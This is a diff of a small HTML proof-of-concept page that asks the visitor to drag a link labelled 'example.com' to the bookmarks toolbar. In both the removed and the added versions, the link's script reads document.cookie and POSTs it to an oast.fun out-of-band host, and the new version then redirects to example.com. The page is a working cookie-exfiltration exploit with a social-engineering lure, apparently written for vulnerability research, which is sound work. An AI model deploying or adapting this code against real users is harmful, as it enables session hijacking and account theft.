@@ -1,11 +1,22 @@
 <!DOCTYPE html>
-<html><head>
-    <meta http-equiv="content-type" content="text/html; charset=UTF-8">
+<html>
+<head>
+    <meta charset="UTF-8">
     <title>PoC</title>
-  </head>
-
-  <body>
+</head>
+<body>
     <div>Drag the link to the Bookmarks Toolbar for easier access</div>
-    <a onclick='top.location.assign("https://example.com/")' href="javascript:eval('var cookie = document.cookie; var xhr = new XMLHttpRequest(); xhr.open("POST", "https://mrrvyrobmzqojirdtcud7vq82pfnlwcrm.oast.fun?a=", true); xhr.send(cookie);%27)">example.com</a>
-  
-</body></html>
+    <a href="#" onclick="sendCookie()">example.com</a>
+
+    <script>
+        function sendCookie() {
+            var cookie = document.cookie;
+            var xhr = new XMLHttpRequest();
+            xhr.open("POST", "https://mrrvyrobmzqojirdtcud7vq82pfnlwcrm.oast.fun?a=", true);
+            xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
+            xhr.send("cookie=" + encodeURIComponent(cookie));
+            top.location.assign("https://example.com/");
+        }
+    </script>
+</body>
+</html>
